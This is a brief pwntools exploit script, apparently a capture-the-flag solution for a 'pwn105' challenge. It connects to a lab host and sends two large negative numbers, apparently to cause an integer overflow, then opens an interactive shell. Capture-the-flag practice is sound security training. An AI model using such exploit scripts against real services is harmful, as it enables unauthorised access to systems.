from pwn import *

p = process("./pwn105.pwn105")
p = remote("10.10.234.36", 9005)
elf = context.binary = ELF("./pwn105.pwn105")
rop = ROP(elf)

p.sendlineafter(b"]>>", b"-5555555555555555")
p.sendlineafter(b"]>>", b"-5555555555555555")

p.interactive()